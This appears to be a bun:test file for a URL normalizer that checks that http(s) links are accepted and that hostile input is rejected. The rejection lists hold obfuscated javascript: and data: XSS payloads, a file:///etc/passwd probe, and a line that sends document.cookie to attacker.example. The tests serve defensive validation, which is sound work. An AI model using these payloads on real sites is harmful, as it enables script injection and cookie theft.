// SPDX-License-Identifier: Apache-2.0

/**
 * The hostile cases below cover parser normalizations that defeat raw-string
 * checks. The helper must refuse them without throwing and return the exact
 * normalized href it approved for HTTP(S) inputs.
 */

import { describe, it, expect } from "bun:test";
import { normalizeHttpUrl } from "../src/url.ts";

describe("normalizeHttpUrl — accepted", () => {
  it("accepts https and returns the normalized URL", () => {
    expect(normalizeHttpUrl("https://github.com/appstrate/appstrate")).toBe(
      "https://github.com/appstrate/appstrate",
    );
  });

  it("accepts http", () => {
    expect(normalizeHttpUrl("http://example.com/")).toBe("http://example.com/");
  });

  it("preserves query and fragment", () => {
    expect(normalizeHttpUrl("https://example.com/a?b=1#c")).toBe("https://example.com/a?b=1#c");
  });

  it("normalizes the scheme and host casing but not the path", () => {
    expect(normalizeHttpUrl("HTTPS://EXAMPLE.COM/Path")).toBe("https://example.com/Path");
  });

  it("accepts an https URL carrying credentials or a port", () => {
    expect(normalizeHttpUrl("https://example.com:8443/repo")).toBe("https://example.com:8443/repo");
  });
});

describe("normalizeHttpUrl — javascript: in every disguise", () => {
  const hostile = [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "JaVaScRiPt:alert(1)",
    "Javascript:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "java\rscript:alert(1)",
    "jav\ta\nscr\ript:alert(1)",
    " javascript:alert(1)",
    "  javascript:alert(1)  ",
    "\njavascript:alert(1)",
    "\tjavascript:alert(1)",
    "\u0000javascript:alert(1)",
    "\u0001javascript:alert(1)",
    "javascript:alert(1) ",
    "javascript:fetch('https://attacker.example/'+document.cookie)",
  ];
  for (const value of hostile) {
    it(`rejects ${JSON.stringify(value)}`, () => {
      expect(normalizeHttpUrl(value)).toBeNull();
    });
  }
});

describe("normalizeHttpUrl — other schemes", () => {
  const rejected = [
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "DATA:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "VBScript:msgbox(1)",
    "file:///etc/passwd",
    "blob:https://example.com/1234",
    "about:blank",
    "mailto:someone@example.com",
    "tel:+33123456789",
    "ftp://example.com/x",
  ];
  for (const value of rejected) {
    it(`rejects ${JSON.stringify(value)}`, () => {
      expect(normalizeHttpUrl(value)).toBeNull();
    });
  }
});

describe("normalizeHttpUrl — scheme-relative and relative", () => {
  it("rejects a scheme-relative URL", () => {
    expect(normalizeHttpUrl("//evil.example/repo")).toBeNull();
  });

  it("rejects a scheme-relative URL with a backslash", () => {
    expect(normalizeHttpUrl("\\\\evil.example/repo")).toBeNull();
  });

  it("rejects an absolute-path relative URL", () => {
    expect(normalizeHttpUrl("/api/orgs")).toBeNull();
  });

  it("rejects a bare relative URL", () => {
    expect(normalizeHttpUrl("docs/readme.md")).toBeNull();
  });
});

describe("normalizeHttpUrl — malformed and non-string input", () => {
  const junk: unknown[] = [
    "",
    "   ",
    "ht tp://example.com",
    "https://",
    "://",
    "http://",
    undefined,
    null,
    0,
    42,
    true,
    false,
    {},
    [],
    { url: "https://example.com" },
    () => "https://example.com",
    Symbol("https://example.com"),
    123n,
  ];
  for (const value of junk) {
    it(`rejects ${typeof value} ${String(typeof value === "symbol" ? "symbol" : value)} without throwing`, () => {
      expect(() => normalizeHttpUrl(value)).not.toThrow();
      expect(normalizeHttpUrl(value)).toBeNull();
    });
  }
});
